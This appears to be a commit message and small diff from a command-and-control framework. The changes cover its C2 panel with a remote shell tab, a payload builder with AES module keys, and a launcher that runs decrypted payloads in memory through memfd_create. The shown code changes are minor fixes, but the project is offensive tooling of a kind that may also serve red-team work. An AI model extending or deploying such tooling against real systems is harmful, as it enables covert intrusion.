Update docs and dashboard: integration walkthrough, module_aes_key chain, 4-tab UI, build API
- docs/INTEGRATION_TEST_WALKTHROUGH.md: new file documenting full e2e test session
- README.md: flat TOML config, build API, REST endpoints, docs index table
- docs/ARCHITECTURE.md: build pipeline flowchart, module_aes_key chain, REST API table, dashboard tabs
- docs/QUICKSTART.md: 4-tab dashboard, build options (web/API/cargo/launcher), troubleshooting
- docs/CONFIGURATION.md: flat TOML schema, BuildRequest/BuildFeatures field tables, ENV vars
- docs/FEATURES.md: Build API feature flags section, module_aes_key section, outbound-c table update
- builder/README.md: module_aes_key field, server API propagation note, wire format correction
- docs/LOCAL_TESTING_GUIDE.md: ORCHESTRA_MODULE_AES_KEY in all build commands, updated server config
- docs/C2_PANEL_STARTUP.md: remove stale compile-error section, 4-tab dashboard, new config fields
- docs/CONTROL_CENTER.md: new config fields, GET /api/info/fingerprint endpoint
- docs/C_SERVER.md: updated config block, fingerprint endpoint in REST API table
- docs/OPERATOR_MANUAL.md: flat TOML config, REST API build workflow
- docs/SECURITY.md: module_aes_key in hardening checklist and credentials table
- docs/CONTRIBUTING.md: ORCHESTRA_MODULE_AES_KEY in dev workflow
- orchestra-server/static/: 4-tab dashboard (Dashboard, Shell, Builder, Audit Log)
- orchestra-server/src/: build_handler enriched API, /api/info/fingerprint endpoint
- agent/build.rs: ORCHESTRA_* -> SYS_* env var forwarding
- agent/src/lib.rs: option_env SYS_MODULE_KEY fallback
- builder/src/: module_aes_key propagation through PayloadConfig
- orchestra-server/src/config.rs: allow_local_builds field

+++ launcher/src/main.rs
@@ -30,7 +30,6 @@ use anyhow::{anyhow, Context, Result};
 use base64::Engine;
 use clap::Parser;
 use common::CryptoSession;
-use rand::seq::SliceRandom;
 
 #[derive(Parser, Debug)]
 #[command(
@@ -664,6 +663,7 @@ fn chacha20_xor(data: &[u8], key: &[u8]) -> Vec<u8> {
 
 #[cfg(target_os = "linux")]
 fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
+    use rand::seq::SliceRandom;
     use std::ffi::CString;
     use std::io::Write;
     use std::os::unix::io::FromRawFd;
@@ -721,7 +721,7 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
     use std::io::Write;
     use std::os::unix::io::{FromRawFd, IntoRawFd, RawFd};
 
-    const MACOS_SYS_MEMFD_CREATE: libc::c_long = 518;
+    const MACOS_SYS_MEMFD_CREATE: libc::c_int = 518;
 
     fn write_payload(fd: RawFd, payload: &[u8]) -> Result<()> {
         // SAFETY: `fd` is owned by this function call and valid while `file` is alive.
